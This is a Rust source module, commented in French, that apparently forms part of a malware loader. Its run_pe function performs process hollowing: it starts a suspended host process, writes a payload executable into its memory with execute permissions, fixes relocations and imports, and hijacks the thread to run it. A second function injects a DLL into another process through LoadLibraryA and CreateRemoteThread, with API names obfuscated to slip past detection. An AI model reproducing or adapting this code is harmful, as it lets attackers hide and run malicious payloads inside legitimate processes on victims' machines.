pub mod pe;
pub mod process;

use std::ptr;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory}; // Ajout de WriteProcessMemory
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

pub unsafe fn run_pe(payload: Vec<u8>) {
    let pi = match process::spawn_suspended_host() {
        Some(info) => info,
        None => return,
    };

    let dos_header = &*(payload.as_ptr() as *const IMAGE_DOS_HEADER);
    let nt_headers = &*(payload.as_ptr().offset(dos_header.e_lfanew as isize) as *const IMAGE_NT_HEADERS64);
    let section_ptr = (payload.as_ptr().offset(dos_header.e_lfanew as isize) as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;

    let img_size = nt_headers.OptionalHeader.SizeOfImage as usize;
    let mut dest_addr = VirtualAllocEx(pi.hProcess, nt_headers.OptionalHeader.ImageBase as *mut _, img_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    let mut delta: isize = 0;
    if dest_addr.is_null() {
        dest_addr = VirtualAllocEx(pi.hProcess, ptr::null_mut(), img_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        delta = (dest_addr as isize).wrapping_sub(nt_headers.OptionalHeader.ImageBase as isize);
    }

    // --- COPIE DES HEADERS ---
    let mut bw = 0;
    WriteProcessMemory(pi.hProcess, dest_addr, payload.as_ptr() as *const _, nt_headers.OptionalHeader.SizeOfHeaders as usize, &mut bw);

    // --- COPIE DES SECTIONS ---
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section = &*section_ptr.offset(i as isize);
        if section.SizeOfRawData > 0 {
            let dest = (dest_addr as usize + section.VirtualAddress as usize) as *mut _;
            let src = payload.as_ptr().offset(section.PointerToRawData as isize) as *const _;
            WriteProcessMemory(pi.hProcess, dest, src, section.SizeOfRawData as usize, &mut bw);
        }
    }

    // Appels splités
    pe::apply_relocations(pi.hProcess, &payload, dest_addr as usize, delta, nt_headers, section_ptr);
    pe::resolve_imports(pi.hProcess, &payload, dest_addr as usize, nt_headers, section_ptr);

    process::hijack_thread(&pi, dest_addr as usize, nt_headers.OptionalHeader.AddressOfEntryPoint);
}

pub unsafe fn inject_remote_dll(h_process: winapi::um::winnt::HANDLE, dll_name: &str) {
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualFreeEx};
    use winapi::um::processthreadsapi::CreateRemoteThread;
    use winapi::um::synchapi::WaitForSingleObject;
    use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE};
    use std::ffi::CString;

    // 1. Récupération de l'adresse de LoadLibraryA
    let k32 = CString::new(obfstr!("kernel32.dll")).unwrap();
    let loadlib = CString::new(obfstr!("LoadLibraryA")).unwrap();
    
    let h_kernel32 = GetModuleHandleA(k32.as_ptr());
    let load_lib_addr = GetProcAddress(h_kernel32, loadlib.as_ptr());

    if load_lib_addr.is_null() { return; }

    // Préparation du chemin de la DLL en mémoire distante
    let c_dll_name = CString::new(dll_name).unwrap();
    let dll_name_size = c_dll_name.as_bytes_with_nul().len();

    let remote_mem = VirtualAllocEx(
        h_process, 
        std::ptr::null_mut(), 
        dll_name_size, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    
    if remote_mem.is_null() { return; }

    // Écriture du chemin de la DLL dans le process cible
    let mut written = 0;
    WriteProcessMemory(
        h_process, 
        remote_mem, 
        c_dll_name.as_ptr() as *const _, 
        dll_name_size, 
        &mut written
    );

    // Exécution de LoadLibraryA via un thread distant
    let h_thread = CreateRemoteThread(
        h_process, 
        std::ptr::null_mut(), 
        0, 
        Some(std::mem::transmute(load_lib_addr)), 
        remote_mem, 
        0, 
        std::ptr::null_mut()
    );

    if !h_thread.is_null() {
        WaitForSingleObject(h_thread, 5000); // Attente max 5s
        winapi::um::handleapi::CloseHandle(h_thread);
    }
    
    // Nettoyage de la mémoire allouée
    VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
}
